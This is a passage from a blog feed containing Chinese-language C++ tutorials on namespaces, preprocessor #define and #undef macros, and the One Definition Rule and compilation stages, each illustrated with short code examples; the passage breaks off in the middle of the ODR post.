class="function"><span class="type">void</span> <span class="title">stop</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">down</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>预处理用的不多，但是要知道能配套使用，且配套使用的时候要形成闭环，不然又是个逻辑鬼才。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编译器角度】namespace</title>
      <link href="/2022/06/17/namespace/"/>
      <url>/2022/06/17/namespace/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>常用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br></pre></td></tr></table></figure><p>std就是一个命名空间。</p><span id="more"></span><p>当然最终感觉还是为了便于管理。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line">    <span class="type">int</span> ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把需要用到的函数和变量或者结构体之类的塞到一个命名空间中，这样下次调用起来就很方便：<code>hack::...</code></p><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line"><span class="type">int</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> hack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">value = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里因为解锁了hack空间，所以里面的变量可以直接调用，但是这样不好的事如果别处有同样定义的变量还是会冲突的。<br>这也是为什么大部分人其实一开始不会直接<code>using namespace std;</code>因为std里面有很多的变量啊之类的，就怕你词穷冲突了。解决的办法就是用到啥using一下：<code>using std::cout;</code>。<br><strong>良好的代码习惯固然重要，但是后期团队协作还是要看整体风格</strong></p><hr><h2 id="全局命名空间"><a href="#全局命名空间" class="headerlink" title="全局命名空间"></a>全局命名空间</h2><p>就是说具有链接或者外部属性的对象，只要不存在于定义的命名空间内，就默认定义在全局命名空间中。在全局命名空间中的访问不需要额外指定，除非局部的变量重复了，就需要用到全局命名空间指定。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="type">int</span> a = <span class="number">100</span>;</span><br><span class="line">::a = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/17/namespace/000.png" class=""><p>能够看到两个a的值是不同的。</p><p>当然这个链接或外部属性是什么意思的，就是全局变量，且非静态的。<br>像main函数之内的<code>int a;</code>就是局部的，他就不会存在于全局命名空间。</p><blockquote><p>::前面没东西就是全局</p></blockquote><hr><h2 id="命名空间拓展"><a href="#命名空间拓展" class="headerlink" title="命名空间拓展"></a>命名空间拓展</h2><p>在标准头文件中<code>&lt;iostream&gt;</code>是最常使用的头文件，其中std命名空间自然在其中。<br>当引用其它头文件，比如<code>&lt;string&gt;</code>的时候，它也需要从std命名空间中使用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    std::string str = <span class="string">&quot;12334&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这说明命名空间是可以拓展的，而且拓展的方法也很简单，在写一个<code>namespace std</code>的操作即可</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line"><span class="type">int</span> value;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> hack;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line"><span class="type">float</span> height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/17/namespace/001.png" class=""><p>可以看到分开写的命名空间hack各自有一个成员，但是调用的时候是统一的。</p><hr><h2 id="命名空间的声明"><a href="#命名空间的声明" class="headerlink" title="命名空间的声明"></a>命名空间的声明</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于变量，这种情况我们默认就当成定义了，因为即便没有初始化也有可能分配到一个垃圾值。或者被优化掉。<br>声明一个变量之前提到过加上extern</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line">    <span class="keyword">extern</span> <span class="type">int</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> value;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">::value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的value还是处于全局命名空间。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.cpp</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;main.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> hack::value = <span class="number">200</span>;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main.h</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>照例输出一下：<img src="/2022/06/17/namespace/002.png" class=""></p><p>并且函数也是同样的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> value;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;main.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line"><span class="type">float</span> height=<span class="number">25.25</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> hack::value = <span class="number">200</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hack::test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; hack::height;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">hack::<span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出一下：<img src="/2022/06/17/namespace/003.png" class=""></p><p><strong>所以声明和定义选择上跟源文件和头文件、源文件和源文件之间的联系是一样的</strong></p><hr><h2 id="命名空间的嵌套"><a href="#命名空间的嵌套" class="headerlink" title="命名空间的嵌套"></a>命名空间的嵌套</h2><p>函数能套娃，命名空间也能套娃</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line"><span class="type">float</span> height=<span class="number">25.25</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> hackbar&#123;</span><br><span class="line"><span class="type">int</span> hack_he;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    hack::hackbar::hack_he;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>多套几层也没啥事，反正能够通过<code>::</code>访问到。</strong></p><hr><h2 id="未命名的命名空间"><a href="#未命名的命名空间" class="headerlink" title="未命名的命名空间"></a>未命名的命名空间</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未命名的命名空间中的声明一律为内部连接属性，包括用extern声明的内容，且未命名的命名空间只在本转换单元有效。</p><p>一个函数不能同时出现在多个源文件当中，因为在编译的时候会发生重复定义。<br>按照C语言当时的习惯就是使用static或者inline之类的，当然c++之后是不期望这么用的。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;hhh\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">hhh</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这种情况下，hhh函数不会发生报错，因为它存在于未命名命名空间中，具有内部连接属性，跟外部不冲突。</p><p>而且即使不同源文件都出现：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">hhh</span><span class="params">()</span></span>&#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;hhh\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>也不会像之前的命名空间会自然拓展，未命名命名空间是完全独立的。</p><hr><h2 id="命名空间别名"><a href="#命名空间别名" class="headerlink" title="命名空间别名"></a>命名空间别名</h2><p>之前给结构体哪些创建别名都是通过<code>typedef</code><br>命名空间有自己起别名的方式<code>namespace a = xxx::xxx</code>之类的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> hack&#123;</span><br><span class="line"><span class="type">float</span> height=<span class="number">25.25</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> hackbar&#123;</span><br><span class="line"><span class="type">int</span> hack_he;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> a = hack::hackbar;</span><br></pre></td></tr></table></figure><p>那么下次调用hackbar的参数，就可以直接从<code>a::hack_he</code>了。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>c++特性，还是要好好了解的，毕竟后面还有类。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编译器角度】define</title>
      <link href="/2022/06/16/define/"/>
      <url>/2022/06/16/define/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>#define 通常用作定义常量<br>如<code>#define Pi 3.14</code></p><span id="more"></span><p>甚至替换类型之类的操作<code>#define 整型 int</code><br>以至于当时无聊的时候还真有人用define去写中文编程语言</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 整数 int</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> 输出 std::cout </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    整数 a = <span class="number">100</span>;</span><br><span class="line">    输出 &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/16/define/000.png" class=""><p>也是能跑的，但是玩归玩</p><blockquote><p>宏定义的名称也与变量名称规则一致，不允许数字开头</p></blockquote><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="正经情况"><a href="#正经情况" class="headerlink" title="正经情况"></a>正经情况</h2><p>实际上嘛，常量除了define还有个const<br>#define定义在头上可能是因为更直观吧，像windows api里面就有一堆#define</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SCREEN_WIDTH 1980</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> screen_width&#123;<span class="number">1980</span>&#125;;</span><br></pre></td></tr></table></figure><p>c时期define用的多，c++可能更多的用const，但是因为先学c在学c++，所以习惯是潜移默化的。<br>const定义的好处就是类型检测，限定类型肯定更加严谨。<br>而#define则相对无脑替换，你可以用它做一些非正常逻辑的事。比如<code>#define true false</code>，真就是真真假假假假真真。<br>而且有一种情况下，#define会出事，就是只定义了要替换的名，而不定义要替换成什么。<code>#define x</code>，你没有东西要替换</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> x</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> x a = <span class="number">2500</span>;</span><br><span class="line">    std::cout &lt;&lt; a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>要注意不能是int xa，因为这是一个独立的存在，int x a，x才会被宏替换</p></blockquote><p>但是这种在特定情况下有特殊意义：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _in_</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _out_</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">add</span><span class="params">(_in_ <span class="type">int</span> a,_in_ <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>这种情况下，无非就是像注释一样告诉你这个参数是要输入的。<br>不过这里值得一提的是jetbrains的软件很早就做了提示形参的功能。<br>虽然vs2022 在后面版本也支持了类似的功能。<br>但是这种方法在早期编写的时候的确带来了很大帮助。</p></blockquote><hr><h2 id="undef"><a href="#undef" class="headerlink" title="undef"></a>undef</h2><p>之前玩头文件的时候知道防重复除了<code>#pragma once</code>,还有个<code>#ifdef DEBUG  #endif</code>，表示从define标记的地方开始到结束。<br>然后这里还有个undef，是表示取消define。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _Test_</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> _Test_ a = <span class="number">100</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _Test_</span></span><br><span class="line">    <span class="type">int</span> _Test_ b = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/16/define/001.png" class=""><p>看到当undef掉<code>_Test_</code>的时候，无法再次使用这个宏。</p><p>由于编译特性是自上而下，逐条编译，所以就导致了即使这个undef写在其他函数或者地方，即使没有调用一样也已经删掉这个宏了。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _Test_</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">hh</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _Test_</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;hello\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> _Test_ a = <span class="number">100</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> _Test_</span></span><br><span class="line">    <span class="type">int</span> _Test_ b = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2022/06/16/define/002.png" class=""><p>所以说有的是bug都是人为的哈哈哈。。</p><hr><h2 id="复杂的宏"><a href="#复杂的宏" class="headerlink" title="复杂的宏"></a>复杂的宏</h2><p>简单的常量替换已经没啥问题了，宏还有更厉害的就是可以设计表达式</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SUM(x,y) x+y</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> AVE(x,y) (x+y)/2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ToBig(x,y) (x &gt; y ? x : y)</span></span><br></pre></td></tr></table></figure><p>这种表达式就比函数又更骚了。但是他不同于函数，函数要入栈，又要入参，又要保持栈平衡。<br>在预编译的时候就会展开头文件替换所有的宏。</p><p>其次在动态开辟的时候，每次都要手动释放delete。那么也同样可以通过宏去干掉。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DeNullPtr(x) delete[] x;x=nullptr;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> *a = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">DeNullPtr</span>(a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同样是没问题的。<img src="/2022/06/16/define/003.png" class=""><br>地址是0是因为nullptr的结果。<br>换个角度也其实挺像内联的，</p><hr><p><strong># 可以将一个标识符参数字符串化</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SHOW(x) std::cout &lt;&lt; #x</span></span><br><span class="line"><span class="built_in">SHOW</span>(<span class="number">1234f</span>g); <span class="comment">//=&gt; std::cout &lt;&lt; &quot;1234fg&quot;;</span></span><br></pre></td></tr></table></figure><p><strong>## 可以连结两个标识符</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> T1(x,y) void x##y()&#123;std::cout &lt;&lt; #y;&#125;</span></span><br><span class="line"><span class="built_in">T1</span>(test, <span class="number">01</span>)</span><br></pre></td></tr></table></figure><p>这样就会生成一个函数</p><img src="/2022/06/16/define/004.png" class=""><p>看到两个井号连结在了一起，将x和y当作函数名，然后输出y即可。<br>实际上肯定也能调用显示：<img src="/2022/06/16/define/005.png" class=""><br>输出01是因为宏定义的时候输出的y部分，要想输出test也可以输出x即可。</p><hr><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>define的骚操作取决于程序员有多骚了可以说是。</p>]]></content>
      
      
      <categories>
          
          <category> cpp学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cpp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【编译器角度】ODR</title>
      <link href="/2022/06/15/ODR/"/>
      <url>/2022/06/15/ODR/</url>
      
        <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>全称为<code>One Definition Rule</code>，可以说是单定义原则或者规则<br>是为c++的语法规则，这个规则指出变量只能有一次定义。</p><span id="more"></span><hr><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a>编译过程</h2><p>回顾编译的四大过程。预处理，编译，汇编，链接。<br>预处理 就是替换所有的宏定义，展开include的头文件，去掉注释和一些无关的。[由.c&#x2F;.cpp 到 .i]<br>编译 就是将高级语言的代码转换成机器语言的过程，主要进行语法之类的分析，优化成汇编。 [由.i 到 .s]<br>汇编 就是将源文件翻译成二进制，Windows会转换成.obj文件，类unix的为.o文件。 [.o文件时机器码所以纯文本无法正常显示]<br>链接 就是将.o文件和库文件绑定到一起，最终形成所谓的可执行程序。</p><p>这里的编译器用的visual studio了。<br>抽象上，.c&#x2F;.cpp + include&lt;.h&gt; 合并后称为转换单元<br>然后转换成.obj之类的，因为是windows平台。<br>最后链接成可执行程序.exe<br>当一切顺利时，自然不会有问题。语法上的编译器在编译器之前就能给出错误和警告。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;hhh&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="built_in">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主函数调用了一个函数，这个函数在编译的时候会先取一个别名，然后再去替换内存地址。如果不存在就会看到一个lnk类型的报错：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 